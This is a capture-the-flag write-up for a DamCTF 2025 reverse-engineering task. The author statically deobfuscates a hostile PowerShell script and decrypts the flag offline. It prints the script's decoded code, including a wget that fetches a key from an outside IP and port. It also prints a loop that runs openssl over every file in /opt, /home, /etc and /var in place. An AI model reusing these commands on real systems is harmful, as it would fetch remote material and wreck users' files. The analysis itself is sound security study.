# DamCTF 2025: The Bash.ps1 Challenge

## Challenge Description
**Category:** Reverse Engineering  
**Files:** 
- `bash.ps1` - An obfuscated PowerShell script
- `enc` - An encrypted file with OpenSSL format

**Warning:** ⚠️ Do not run the PowerShell script! It contains code that could potentially harm your system.

## Initial Analysis

I started by examining the files to understand what I was dealing with:

```bash
$ file *
bash.ps1: ASCII text, with very long lines (2716), with CRLF line terminators
enc:      openssl enc'd data with salted password
```

The challenge provides a PowerShell script and an encrypted file. The script appears to be responsible for decrypting the `enc` file, but is heavily obfuscated with variable and function names consisting entirely of 'A' characters.

## Approach: Systematic Deobfuscation

Rather than executing the potentially harmful script, I decided to analyze it statically by systematically renaming variables and functions based on their behavior.

## Step 1: Understanding the Script Flow

After deobfuscation, I identified that the script follows this sequence:

```
Main
 ├─ CheckEnvironment
 ├─ BuildCharacterDictionary
 ├─ DownloadKey
 ├─ ProcessEncryptedFiles
 └─ RemoveKey
```

## Step 2: Analyzing Each Function

### CheckEnvironment Function

This function implements safety checks to prevent accidental execution:

```powershell
function CheckEnvironment 
{
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}
    if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit}
    if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit}
}
```

The key insights from this function:
- It checks if the script is running on Ubuntu 24.04 (Noble Numbat)
- It verifies a specific MAC address
- It ensures the script runs with specific user permissions

### BuildCharacterDictionary Function

This function constructs a custom character dictionary from OS information:

```powershell
function BuildCharacterDictionary
{
    $osReleaseLines = # Content of /etc/*release* from Ubuntu Noble
    $characterArray = # Complex concatenation of OS release lines
    $characterArray = (-join ($characterArray | sort-object | get-unique))
    $Global:CharacterDictionary = $characterArray
}
```

To accurately recreate this dictionary, I spun up a Docker container with Ubuntu Noble:

```bash
$ docker run -it ubuntu:noble /bin/bash
# Inside container
$ cat /etc/*release*
```

This gave me the exact OS release information needed to build the character dictionary. After processing according to the script's algorithm, I determined the dictionary was:
```
"-./:0123456789:=ABCDEGHIKLMNOPRSTUVY_abcdeghilmnoprstuvwy"
```

### DownloadKey Function

This function constructs a URL and downloads the decryption key:

```powershell
function DownloadKey 
{
    $keyUrl = # URL built from character indices
    $outputFile = $GLOBAL:CharacterDictionary[16]  # 'A'
    &(Get-Command /???/?ge?) $keyUrl -q -O $outputFile
}
```

By decoding the character indices against our dictionary, I determined the command being executed was:
```bash
wget 35.87.165.65:31337/key -q -O A
```

This downloads a key from the given IP address and port, saving it to a file named 'A'. For the challenge, I created this file with the mentioned key content.

### ProcessEncryptedFiles Function

This function executes the actual decryption:

```powershell
function ProcessEncryptedFiles
{
    foreach ($encryptedFile in (Invoke-Expression ('find /opt/ -type f')))
    {
        Invoke-Expression ("openssl enc -aes-256-cbc -d -pass file:key -in $encryptedFile -out $encryptedFile")
    }
    # Similar loops for /home/, /etc/, and /var/
}
```

The function:
1. Searches four system directories (/opt/, /home/, /etc/, /var/) for all files
2. Attempts to decrypt each file using OpenSSL with AES-256-CBC
3. Uses the key downloaded earlier

This informed me that I needed to use OpenSSL with AES-256-CBC for decryption.

## Step 3: Decrypting the Flag

Based on my analysis, I knew:
1. The encryption algorithm (AES-256-CBC)
2. The key was downloaded to a file named 'A'
3. The script uses the key with `-pass file:key`

The key downloaded from the URL was:
```
I understand that, without my agreement, Alpine F1 have put out a press release late this afternoon that I am driving for them next year. This is wrong and I have not signed a contract with Alpine for 2023. I will not be driving for Alpine next year.
```

To decrypt the flag, I ran:

```bash
$ openssl enc -aes-256-cbc -d -pass file:A -in enc -out flag
$ cat flag
dam{unattended_arch_boxes_will_be_given_powershell}
```

## Flag
`dam{unattended_arch_boxes_will_be_given_powershell}`
